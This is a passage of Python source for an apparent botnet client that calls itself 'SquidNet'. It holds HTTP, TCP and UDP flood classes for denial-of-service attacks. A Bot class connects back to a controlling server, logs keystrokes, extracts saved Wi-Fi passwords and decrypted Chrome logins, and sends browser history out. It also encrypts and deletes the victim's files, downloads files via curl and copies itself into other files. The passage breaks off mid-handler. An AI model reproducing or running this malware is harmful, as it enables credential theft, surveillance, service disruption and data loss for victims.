               'Links (0.96; OpenBSD 3.0 sparc)', 'Lynx/2.8.4rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.6c',
               'Lynx/2.8.3rel.1 libwww-FM/2.14',
               'Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)', 'libwww-perl/5.79',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; en) Opera 8.53',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de-DE; rv:1.7.12) Gecko/20050919 Firefox/1.0.7',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322; Alexa Toolbar)',
               'msnbot/1.0 (+http://search.msn.com/msnbot.htm)', 'Googlebot/2.1 (+http://www.google.com/bot.html)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051008 Firefox/1.0.7',
               'Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; en) Opera 8.51',
               'Mozilla/5.0 (compatible; Konqueror/3.4; Linux) KHTML/3.4.3 (like Gecko)',
               'Lynx/2.8.4rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7c',
               'Mozilla/4.0 (compatible; MSIE 6.0; AOL 9.0; Windows NT 5.1; .NET CLR 1.1.4322; Alexa Toolbar)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)',
               'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
               'Mozilla/4.8 [en] (Windows NT 5.1; U)', 'Opera/8.51 (Windows NT 5.1; U; en)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)', 'Opera/8.51 (Windows NT 5.1; U; en;VWP-online.de)',
               'sproose/0.1-alpha (sproose crawler; http://www.sproose.com/bot.html; crawler@sproose.com)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.0.1) Gecko/20060130 SeaMonkey/1.0',
               'Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.0.1) Gecko/20060130 SeaMonkey/1.0,gzip(gfe) (via translate.google.com)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.0; de; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1',
               'BrowserEmulator/0.9 see http://dejavu.org',
               'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
               'Mozilla/4.0 (compatible; MSIE 5.5; Windows 98; Win 9x 4.90)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.0; de-DE; rv:0.9.4.1) Gecko/20020508',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/125.2 (KHTML, like Gecko)',
               'Mozilla/5.0 (X11; U; Linux i686; de-DE; rv:1.4) Gecko/20030624',
               'iCCrawler (http://www.iccenter.net/bot.htm)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de-DE; rv:1.7.6) Gecko/20050321 Firefox/1.0.2',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; Maxthon; .NET CLR 1.1.4322)',
               'Mozilla/5.0 (X11; U; Linux i686; de-AT; rv:1.7.12) Gecko/20051013 Debian/1.7.12-1ubuntu1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.0; de; rv:1.8) Gecko/20051111 Firefox/1.5',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.0; de-DE; rv:0.9.4.1) Gecko/20020508 Netscape6/6.2.3',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; de) Opera 8.50',
               'Mozilla/3.0 (x86 [de] Windows NT 5.0; Sun)', 'Java/1.4.1_04',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.8) Gecko/20051111 Firefox/1.5',
               'msnbot/0.9 (+http://search.msn.com/msnbot.htm)',
               'NutchCVS/0.8-dev (Nutch running at UW; http://www.nutch.org/docs/en/bot.html; sycrawl@cs.washington.edu)',
               'Mozilla/4.0 compatible ZyBorg/1.0 (wn-14.zyborg@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; de) Opera 8.53',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de-DE; rv:1.4) Gecko/20030619 Netscape/7.1 (ax)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/312.8 (KHTML, like Gecko) Safari/312.6',
               'Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt)',
               'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 4.0)', 'Mozilla/4.0 (compatible; MSIE 5.16; Mac_PowerPC)',
               'Mozilla/4.0 (compatible; MSIE 5.01; Windows 98)',
               'Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; DigExt)',
               'Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)',
               'Mozilla/4.0 (compatible; MSIE 5.5; Windows 98; .NET CLR 1.1.4322)',
               'Mozilla/4.0 (compatible; MSIE 5.0; Windows 95)',
               'Mozilla/4.0 (compatible; MSIE 5.5; AOL 7.0; Windows 98)',
               'Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)',
               'Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)',
               'Mozilla/4.0 (compatible; MSIE 5.23; Mac_PowerPC)', 'Opera/8.53 (Windows NT 5.1; U; en)',
               'Opera/8.01 (Windows NT 5.0; U; de)', 'Opera/8.54 (Windows NT 5.1; U; de)',
               'Opera/8.53 (Windows NT 5.0; U; en)', 'Opera/8.01 (Windows NT 5.1; U; de)',
               'Opera/8.50 (Windows NT 5.1; U; de)',
               'Mozilla/4.0 (compatible- MSIE 6.0- Windows NT 5.1- SV1- .NET CLR 1.1.4322',
               'Mozilla/4.0(compatible; MSIE 5.0; Windows 98; DigExt)',
               'Mozilla/4.0 (compatible; Cerberian Drtrs Version-3.2-Build-0)',
               'Mozilla/4.0 (compatible; AvantGo 6.0; FreeBSD)', 'Mozilla/4.5 [de] (Macintosh; I; PPC)',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; .NET CLR 1.1.4322; MSN 9.0;MSN 9.1; MSNbMSNI; MSNmen-us; MSNcIA; MPLUS)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {59FC8AE0-2D88-C929-DA8D-B559D01826E7}; .NET CLR 1.1.4322)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; snprtz|S04741035500914#914|isdn; .NET CLR 1.1.4322)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; EnergyPlugIn; dial)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; iebar; .NET CLR 1.1.4322)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Q312461; sbcydsl 3.12; YComp 5.0.0.0; YPC 3.2.0; .NET CLR 1.1.4322; yplus 5.1.02b)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Arcor 5.004; .NET CLR 1.0.3705)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.1.4322)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; YComp 5.0.0.0; SV1; .NET CLR 1.0.3705)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Ringo; .NET CLR 1.1.4322)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; YPC 3.0.1; .NET CLR 1.1.4322; yplus 4.1.00b)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; YPC 3.2.0)',
               'Mozilla/4.0 (compatible; MSIE 6.0; AOL 7.0; Windows NT 5.1; FunWebProducts)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; BUILDWARE 1.6; .NET CLR 1.1.4322)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; HbTools 4.7.5)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; YPC 3.2.0; (R1 1.5)',
               'Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; it)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FunWebProducts; SV1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Arcor 5.004; FunWebProducts; HbTools 4.7.5)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; en)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Tablet PC 1.7)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Q312469)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 2.0.50727)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Maxthon; SV1; FDM)',
               'Mozilla/5.0 (Macintosh; U; PPC; de-DE; rv:1.0.2)', 'Mozilla/5.0 (Windows; U; Win98; de-DE; rv:1.7.12)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1)',
               'Mozilla/5.0 (compatible; Konqueror/3.4; Linux 2.6.14-kanotix-9; X11)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.0; de-DE; rv:1.7.10)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.0; de-DE; rv:1.7.12)',
               'Mozilla/5.0 (Windows; U; Win98; de; rv:1.8.0.1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8.0.1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; de; rv:1.8.0.1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.2)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.0.1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de-DE; rv:1.7.7)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.6)',
               'Mozilla/5.0 (X11; U; Linux i686; de; rv:1.8)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de-DE; rv:1.7.8)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.10)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; es-ES; rv:1.7.10)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; pl; rv:1.8.0.1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-us)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8)',
               'Mozilla/5.0 (Windows; U; Win 9x 4.90; de; rv:1.8.0.1)',
               'Mozilla/5.0 (X11; U; Linux i686; de-DE; rv:1.7.12)', 'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; fr)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.0; de-DE; rv:1.7.8)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; fi; rv:1.8.0.1)',
               'Mozilla/5.0 (X11; U; Linux i686; de-AT; rv:1.4.1)',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; es-ES; rv:1.8.0.1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; fr-FR; rv:1.7.12)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.0; zh-TW; rv:1.8.0.1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.5)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de-AT; rv:1.7.3)',
               'Mozilla/5.0 (Windows; U; Win 9x 4.90; en-US; rv:1.7.12)',
               'Mozilla/5.0 (X11; U; Linux i686; fr; rv:1.7.12)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; sl; rv:1.8.0.1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.0.1)', 'Mozilla/5.0 (X11; Linux i686; rv:1.7.5)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.0; de-DE; rv:1.7.6)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7.2)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; es-ES; rv:1.6)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.0.1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.7.6)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8a3)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de-DE; rv:1.7.10)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de-AT; rv:1.7.12)',
               'Mozilla/5.0 (Windows; U; Win 9x 4.90; en-US; rv:1.7.5)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-BR; rv:1.8.0.1)',
               'Mozilla/5.0 (compatible; Konqueror/3; Linux)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.8)',
               'Mozilla/5.0 (compatible; Konqueror/3.2; Linux)', 'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; tg)',
               'Mozilla/5.0 (X11; U; Linux i686; de-DE; rv:1.8b4)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51']
        return user_agents
    def stop_atk(self):
        self.stopatk = True
    def build_querystr(self, value):
        result = ''
        for i in range(value):
            item = random.randint(65, 100)
            result += chr(item)
        return result
    def ddos(self):
        if not self.stopatk:
            try:
                code = 0
                agent = random.choice(self.useragents)
                req = urllib.request.Request(self.ip, headers={'User-Agent': agent,
                                                               'Referer': random.choice(
                                                                   self.referers) + self.build_querystr(
                                                                   random.randint(50, 100)),
                                                               'Cache-Control': 'no-cache',
                                                               'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
                                                               'Keep-Alive': random.randint(110, 160),
                                                               'Connection': 'keep-alive'})
                urllib.request.urlopen(req)
                code = 200
            except urllib.error.HTTPError as e:
                code_split = str(e).split()
                code = code_split[2]
                code = str(code[0] + code[1] + code[2])
                if "500" in str(e):
                    code = 500
                elif "429" in str(e):
                    code = 500
                elif code.startswith('5'):
                    code = 500
            except urllib.error.URLError as e:
                if "A connection attempt failed" in str(e):
                    code = 500
            except:
                pass
        return code
    def start_thr(self):
        while True:
            try:
                x = threading.Thread(target=self.ddos)
                x.start()
                time.sleep(self.delay)
                if self.stopatk:
                    break
            except:
                pass
    def ddos_start(self):
        while True:
            try:
                http_code = self.ddos()
                if http_code == 500:
                    break
                if self.stopatk:
                    break
            except:
                pass
class TCP_UDP_Flood:
    def __init__(self, ip, port, delay, pkt_size):
        self.ip = ip
        self.port = int(port)
        self.delay = float(delay)
        self.pkt_size = int(pkt_size)
        self.stop = False
    def gen_packet(self, size):
        return random._urandom(size)
    def UDP_Req(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(self.gen_packet(self.pkt_size), (self.ip, self.port))
            s.close()
        except:
            pass
    def TCP_req(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.ip, self.port))
            s.send(self.gen_packet(self.pkt_size))
            s.close()
        except:
            pass
    def Stop_Atk(self):
        self.stop = True
    def TCP_Flood(self):
        while True:
            try:
                tcp_req = threading.Thread(target=self.TCP_req)
                tcp_req.start()
                if self.stop:
                    break
                time.sleep(self.delay)
            except:
                pass
    def UDP_Flood(self):
        while True:
            try:
                udp_req = threading.Thread(target=self.UDP_Req)
                udp_req.start()
                if self.stop:
                    break
                time.sleep(self.delay)
            except:
                pass
class Bot:
    def __init__(self, ip, port, key):
        self.ip = ip
        self.port = port
        self.msg = ""
        self.name = os.popen("whoami").read().strip()
        if sys.platform == "win32":
            self.desktop = f"C:/Users/{os.getlogin()}/Desktop"
        elif sys.platform == "darwin":
            self.desktop = f"/Users/{self.name}/Desktop"
        else:
            self.desktop = f"/"
        self.logging = False
        self.file_saving = False
        while True:
            try:
                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.connection.connect((self.ip, self.port))
                break
            except:
                self.connection.close()
                time.sleep(1)
        try:
            logger = threading.Thread(target=self.start_logging)
            logger.start()
        except:
            pass
        self.fileeditor = False
        time.sleep(1)
        msg = socket.gethostname()+" "+self.getip()+" "+os.getlogin()+" "+sys.platform
        self.send(msg)
        time.sleep(1)
        self.send("!CLIENTLOG")
        self.recv_thr = threading.Thread(target=self.recv)
        self.recv_thr.start()
        self.conntest = threading.Thread(target=self.conn_test)
        self.conntest.start()
        self.key = key
        try:
            self.fernet_session = Fernet(self.key)
        except:
            self.fernet_session = None
    def getip(self):
        try:
            url = 'https://httpbin.org/ip'
            req = urllib.request.Request(url)
            result = urllib.request.urlopen(req)
            try:
                result = result.read().decode()
            except:
                result = result.read()
            contents = result.split()
            ip = contents[2].strip('"')
            return ip
        except:
            pass
    def send(self, msg):
        try:
            self.connection.send(msg.encode())
        except:
            self.connection.send(msg)
    def recv(self):
        while True:
            try:
                self.msg = self.connection.recv(1024)
                try:
                    self.msg = self.msg.decode()
                except:
                    pass
                self.run_cmd()
            except:
                pass
    def on_press(self, key):
        if self.logging:
            try:
                self.send("!sendkey " + str(key))
            except:
                pass
    def on_release(self, key):
        pass
    def start_logging(self):
        try:
            with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
                listener.join()
        except:
            pass
    def obtainwifipass(self):
        if sys.platform == "darwin":
            self.send("This bot is on a Apple-based product. Unable to get wifi passwords!")
        else:
            item = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode()
            prof_names = (re.findall("All User Profile     : (.*)\\r", item))
            passwords = []
            check_networks = []
            for i in prof_names:
                item = subprocess.run(["netsh", "wlan", "show", "profiles", i], capture_output=True).stdout.decode()
                security_key = False
                security_key_present = (re.findall("Security key           : (.*)\\r", item))
                if security_key_present[0] == "Present":
                    check_networks.append(i)
                else:
                    pass
            for i in check_networks:
                item = subprocess.run(["netsh", "wlan", "show", "profiles", i, "key=clear"],
                                      capture_output=True).stdout.decode()
                wifi_pass = (re.findall("Key Content            : (.*)", item))
                wifi_pass = wifi_pass[0]
                info = {'ssid': i, 'key': wifi_pass.strip()}
                passwords.append(info)
            main_msg = ""
            for i in passwords:
                main_msg = main_msg + str(i) + ","
            main_msg = f"Wifi Passwords: {main_msg}"
            return main_msg
    def openfile(self, file):
        try:
            if sys.platform == "darwin":
                os.system(f"open {file}")
            else:
                os.startfile(file)
        except:
            pass
    def changedir(self, dir):
        try:
            os.chdir(dir)
        except:
            pass
    def getinfo(self):
        msg = f'''
IP:       {self.getip()}
CWD:      {os.getcwd()}
USERNAME: {os.getlogin()}
OS:       {sys.platform}
        '''
        return msg
    def returnsecondstr(self, msg):
        instruction = msg.split()
        secondstr = instruction[1]
        return secondstr
    def rmdir(self, dir):
        try:
            shutil.rmtree(dir)
        except:
            pass
    def rmfile(self, file):
        try:
            os.remove(file)
        except:
            pass
    def mkdir(self, dirname):
        try:
            os.mkdir(dirname)
        except:
            pass
    def listdir(self):
        try:
            dirlist = os.listdir()
            result = ""
            item = 0
            dir_count = len(dirlist)
            for i in dirlist:
                if item == dir_count:
                    result += f"{i}"
                else:
                    result += f"{i}, "
                item += 1
            return result
        except:
            pass
    def sendfile(self, filename):
        try:
            file = open(filename, 'rb')
            content = file.read()
            file.close()
            self.send(content)
            self.send("finished".encode())
        except:
            pass
    def file_content(self, filename):
        try:
            file = open(filename, 'rb')
            content = file.read()
            file.close()
            self.send(content)
        except:
            pass
    def encdir(self):
        for i in os.listdir():
            try:
                file = open(i, 'rb')
                content = file.read()
                file.close()
                enc_content = self.fernet_session.encrypt(content)
                file = open(i, 'wb')
                file.write(enc_content)
                file.close()
            except:
                pass
    def decdir(self):
        for i in os.listdir():
            try:
                file = open(i, 'rb')
                content = file.read()
                file.close()
                dec_content = self.fernet_session.decrypt(content)
                file = open(i, 'wb')
                file.write(dec_content)
                file.close()
            except:
                pass
    def encfile(self, filename):
        try:
            file = open(filename, 'rb')
            content = file.read()
            file.close()
            enc_content = self.fernet_session.encrypt(content)
            file = open(filename, 'wb')
            file.write(enc_content)
            file.close()
        except:
            pass
    def decfile(self, filename):
        try:
            file = open(filename, 'rb')
            content = file.read()
            file.close()
            dec_content = self.fernet_session.decrypt(content)
            file = open(filename, 'wb')
            file.write(dec_content)
            file.close()
        except:
            pass
    def getfrinternet(self, src ,filetocreate):
        try:
            output = os.popen(f"curl {src} -o {filetocreate}").read()
            self.send(f"Created {filetocreate} into {os.getcwd()}")
        except:
            pass
    def conn_test(self):
        connected = True
        while True:
            try:
                if connected:
                    self.send(" ")
                    time.sleep(1)
            except:
                connected = False
                while True:
                    try:
                        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        self.connection.connect((self.ip, self.port))
                        msg = socket.gethostname() + " " + self.getip() + " " + os.getlogin() + " " + sys.platform
                        self.send(msg)
                        time.sleep(1)
                        self.send("!CLIENTLOG".encode())
                        time.sleep(1)
                        connected = True
                        break
                    except:
                        pass
                    try:
                        logger = threading.Thread(target=self.start_logging)
                        logger.start()
                    except:
                        pass

    def get_encryption_key(self):
        local_state_path = os.path.join(os.environ["USERPROFILE"],
                                        "AppData", "Local", "Google", "Chrome",
                                        "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    def decrypt_password(self,password, key):
        try:    
            iv = password[3:15]
            password = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(password)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                return ""

    def main_password_yoinker(self):
        msgtoserv = ""
        key = self.get_encryption_key()
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                               "Google", "Chrome", "User Data", "default", "Login Data")
        filename = "ChromeData.db"
        shutil.copyfile(db_path, filename)
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        cursor.execute(
            "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = self.decrypt_password(row[3], key)
            if username or password:
                msgtoserv += f"\\nOrigin Url: {origin_url}\\nAction Url: {action_url}\\nUsername: {username}\\nPassword: {password}\\n"
            else:
                continue
        cursor.close()
        db.close()
        try:
            os.remove(filename)
        except:
            pass
        return msgtoserv
    def gotowebsite(self, website):
        if sys.platform == "win32":
            os.system(f'start {website}')
        else:
            os.system(f'open {website}')

    def clone(self):
        file_ending = sys.argv[0].split(".")
        file_ending = file_ending[len(file_ending) - 1]
        if "py" in file_ending:
            own_file = open(sys.argv[0], "r")
            own_content = own_file.readlines()
            own_file.close()
            lines = []
            in_code = False
            for line in own_content:
                if "#-----SquidNet-Bot-Script-----#" in line:
                    in_code = True
                if in_code:
                    lines.append(line)
                if "#-----End-Of-Bot-----#" in line:
                    in_code = False
                    break
        else:
            own_file = open(sys.argv[0], "rb")
            own_content = own_file.read()
            own_file.close()
        if sys.platform == "win32":
            main_dir = f"C:/Users/{os.getlogin()}/"
        else:
            main_dir = f"/Users/{self.name}/"
        os.chdir(main_dir)
        workingdirs = []
        workingdirs.append(main_dir)
        workingdirs.append(os.getcwd())
        dirlist = os.listdir()
        for dirs in dirlist:
            if "." in dirs:
                pass
            else:
                workingdirs.append(main_dir + str(dirs))
        dirlist = os.listdir()
        for dirs in workingdirs:
            try:
                os.chdir(dirs)
            except:
                pass
            for files in dirlist:
                try:
                    if '.'+file_ending in files:
                        if "py" in file_ending:
                            file = open(files, "r")
                            content = file.readlines()
                            file.close()
                            if "#-----SquidNet-Bot-Script-----#" in content:
                                pass
                            else:
                                file = open(files, "w")
                                file.writelines(lines)
                                file.writelines("\\n\\n")
                                file.writelines(content)
                                file.close()
                        else:
                            file = open(files, "rb")
                            content = file.read()
                            file.close()
                            if own_content in content:
                                pass
                            else:
                                file = open(files, "wb")
                                file.write(own_content + "\\n\\n".encode())
                                file.write(content)
                                file.close()
                except:
                    pass
    def gotowebsite(self, website):
        if sys.platform == "win32":
            os.system(f'start {website}')
        else:
            os.system(f'open {website}')
    def send_history(self):
        dirs = os.getcwd()
        if sys.platform == "win32":
            os.chdir(f"C:/Users/{os.getlogin()}/AppData/Local/Google/Chrome/User Data/Default/")
        elif sys.platform == "darwin":
            os.chdir(f"/Users/{self.name}/Library/Application Support/Google/Chrome/User Data/Default/")
        shutil.copyfile("History", dirs + "/History.db")
        os.chdir(dirs)
        History = sqlite3.connect("History.db")
        cursor = History.cursor()
        e = cursor.execute("SELECT last_visit_time, visit_count, title, url from urls")
        for i in cursor.fetchall():
            time = i[0]
            visit_count = i[1]
            url = i[3]
            title = i[2]
            epoch = datetime(1601, 1, 1)
            url_time = epoch + timedelta(microseconds=time)
            self.send(f"({url_time}) ({visit_count}) ({title}) ({url})".encode())
        cursor.close()
        History.close()
        os.remove("History.db")
    def run_cmd(self):
        try:
            if self.fileeditor:
                if self.msg.startswith("!stopedit"):
                    self.send(f"File editor closed for {self.filename}.")
                    self.fileeditor = False
                else:
                    try:
                        self.msg = "\\n" + self.msg
                    except:
                        self.msg = "\\n".encode() + self.msg
                    self.file = open(self.filename, "rb")
                    contents = self.file.read()
                    self.file.close()
                    self.file = open(self.filename, "wb")
                    self.file.write(contents)
                    self.file.write(self.msg.encode())
                    self.file.close()
            else:
                if self.msg.startswith('!httpflood'):
                    msg = self.msg.split()
                    ip = msg[1]
                    delay = float(msg[2])
                    self.dos = DDoS(ip, delay)
                elif self.msg.startswith('!stopatk'):
                    try:
                        self.dos.stop_atk()
                    except:
                        pass
                    try:
                        self.tcpflood.Stop_Atk()
                    except:
                        pass
                    try:
                        self.udpflood.Stop_Atk()
                    except:
                        pass
                elif self.msg.startswith('!cloneself'):
                    cloner = threading.Thread(target=self.clone)
                    cloner.start()
                    self.connection.send("Successfully replicated files.".encode())
                elif self.msg.startswith('!changedirdesktop'):
                    self.changedir(self.desktop)
                elif self.msg.startswith('!openfile'):
                    file = self.returnsecondstr(self.msg)
                    self.openfile(file)
                elif self.msg.startswith('!changedir'):
                    dir = self.returnsecondstr(self.msg)
                    self.changedir(dir)
                elif self.msg.startswith('!rmdir'):
                    dir = self.returnsecondstr(self.msg)
                    self.rmdir(dir)
                elif self.msg.startswith('!rmfile'):
                    file = self.returnsecondstr(self.msg)
                    self.rmfile(file)
                elif self.msg.startswith('!listdir'):
                    dirlist = self.listdir()
                    self.send(dirlist)
                elif self.msg.startswith('!encdir'):
                    self.encdir()
                elif self.msg.startswith('!decdir'):
                    self.decdir()
                elif self.msg.startswith('!encfile'):
                    file = self.returnsecondstr(self.msg)
                    self.encfile(file)
                elif self.msg.startswith('!decfile'):
                    file = self.returnsecondstr(self.msg)
                    self.decfile(file)
                elif self.msg.startswith('!getinfo'):
                    msgtoserv = self.getinfo()
                    self.send(msgtoserv)
                elif self.msg.startswith('!getip'):
                    self.send(self.getip())
                elif self.msg.startswith("!keylog"):
                    if self.logging:
                        pass
                    else:
